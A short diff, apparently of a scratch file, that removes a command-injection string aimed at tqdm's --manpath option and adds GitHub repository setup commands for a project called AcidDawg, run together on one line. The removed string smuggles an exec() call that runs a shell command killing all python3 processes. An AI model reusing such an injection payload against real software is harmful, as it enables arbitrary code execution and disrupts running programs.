@@ -1,2 +1,1 @@
-;python -m tqdm --manpath="\" + str(exec(\"import os\nos.system('echo hi && killall python3')\")) + \""
-.github
+echo "# AcidDawg" >> README.md git init git add README.md git commit -m "first commit" git branch -M main git remote add origin https://github.com/BDARmech/AcidDawg.git git push -u origin main
